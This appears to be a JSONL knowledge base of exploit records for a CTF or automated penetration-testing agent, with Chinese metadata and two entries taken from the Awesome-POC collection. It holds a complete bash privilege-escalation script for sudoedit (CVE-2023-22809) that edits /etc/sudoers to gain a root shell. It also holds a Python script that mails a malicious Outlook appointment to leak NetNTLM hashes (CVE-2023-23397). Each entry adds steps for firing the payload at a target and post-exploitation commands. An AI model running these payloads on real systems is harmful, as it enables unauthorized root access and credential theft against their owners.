{"id": "awesome-poc:cve-2023-22809", "kind": "poc", "title": "Linux Sudo 权限提升漏洞 CVE-2023-22809", "technique": "unknown", "summary": "操作系统漏洞 / CVE-2023-22809。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2023-22809 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["操作系统漏洞", "CVE-2023-22809"], "payload_template": "#!/usr/bin/env bash\n#\n# Exploit Title: sudo 1.8.0 - 1.9.12p1 - Privilege Escalation\n# \n# Exploit Author: n3m1.sys\n# CVE: CVE-2023-22809\n# Date: 2023/01/21\n# Vendor Homepage: https://www.sudo.ws/\n# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz\n# Version: 1.8.0 to 1.9.12p1\n# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9\n#\n# Running this exploit on a vulnerable system allows a localiattacker to gain \n# a root shell on the machine.\n#\n# The exploit checks if the current user has privileges to run sudoedit or \n# sudo -e on a file as root. If so it will open the sudoers file for the\n# attacker to add a line to gain privileges on all the files and get a root \n# shell.\n\nif ! sudo --version | head -1 | grep -qE '(1\\.8.*|1\\.9\\.[0-9]1?(p[1-3])?|1\\.9\\.12p1)$'\nthen\n    echo \"> Currently installed sudo version is not vulnerable\"\n    exit 1\nfi\n\nEXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)\n\nif [ -z \"$EXPLOITABLE\" ]; then\n    echo \"> It doesn't seem that this user can run sudoedit as root\"\n    read -p \"Do you want to proceed anyway? (y/N): \" confirm && [[ $confirm == [yY] ]] || exit 2\nelse\n    echo \"> BINGO! User exploitable\"\nfi\n\necho \"> Opening sudoers file, please add the following line to the file in order to do the privesc:\"\necho \"$USER ALL=(ALL:ALL) ALL\"\nread -n 1 -s -r -p \"Press any key to continue...\"\nEDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLE\nsudo su root\nexit 0", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2023-22809 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 操作系统漏洞/Linux sudo 权限提升漏洞 CVE-2023-22809.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2023-23397:2", "kind": "poc", "title": "Microsoft Outlook 权限提升漏洞 CVE-2023-23397", "technique": "unknown", "summary": "其他漏洞 / CVE-2023-23397。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2023-23397 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["其他漏洞", "CVE-2023-23397"], "payload_template": "import smtplib, datetime, argparse\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.mime.application import MIMEApplication\nfrom email.utils import COMMASPACE, formatdate\nfrom independentsoft.msg import Message\n\n## Mail configuration : change it !\nsmtp_server = \"mail.example.com\"\nsmtp_port = 587\n\nsender_email = \"attacker@mail.example.com\"\nsender_password = \"P@ssw0rd\"\n\nrecipients_email = [\"victim@mail.example.com\"]\n\nclass Email:\n    def __init__(self, smtp_server, port, username, password, recipient):\n        self.smtp_server = smtp_server\n        self.port = port\n        self.username = username\n        self.password = password\n        self.recipient = recipient\n\n    def send(self, subject, body, attachment_path):\n        msg = MIMEMultipart()\n        msg['From'] = self.username\n        msg['To'] = COMMASPACE.join(self.recipient)\n        msg['Date'] = formatdate(localtime=True)\n        msg['Subject'] = subject\n        \n        msg.attach(MIMEText(body))\n\n        with open(attachment_path, 'rb') as f:\n            part = MIMEApplication(f.read(), Name=attachment_path)\n            part['Content-Disposition'] = f'attachment; filename=\"{attachment_path}\"'\n            msg.attach(part)\n\n        try:\n            server = smtplib.SMTP(self.smtp_server, self.port)\n            server.starttls()\n            server.login(self.username, self.password)\n            server.sendmail(self.username, self.recipient, msg.as_string())\n            server.quit()\n            print(\"[+] Malicious appointment sent !\")\n\n\n        except Exception as e:\n            print(\"[-] Error with SMTP server...\", e)\n\nparser = argparse.ArgumentParser(description='CVE-2023-23397 POC : send a malicious appointment to trigger NetNTLM authentication.')\nparser.add_argument('-p', '--path', type=str, help='Local path to process', required=True)\nargs = parser.parse_args()\n\nappointment = Message()\nappointment.message_class = \"IPM.Appointment\"\nappointment.subject = \"CVE-2023-23397\"\nappointment.body = \"New meeting now !\"\nappointment.location = \"Paris\"\nappointment.appointment_start_time = datetime.datetime.now()\nappointment.appointment_end_time = datetime.datetime.now()\nappointment.reminder_override_default = True\nappointment.reminder_sound_file = args.path\nappointment.save(\"appointment.msg\")\n\nemail = Email(smtp_server, smtp_port, sender_email, sender_password, recipients_email)\n\nsubject = \"Hello There !\"\nbody = \"Important appointment !\"\nemail.send(subject, body, \"appointment.msg\")", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2023-23397 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 其他漏洞/Microsoft Outlook 权限提升漏洞 CVE-2023-23397.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
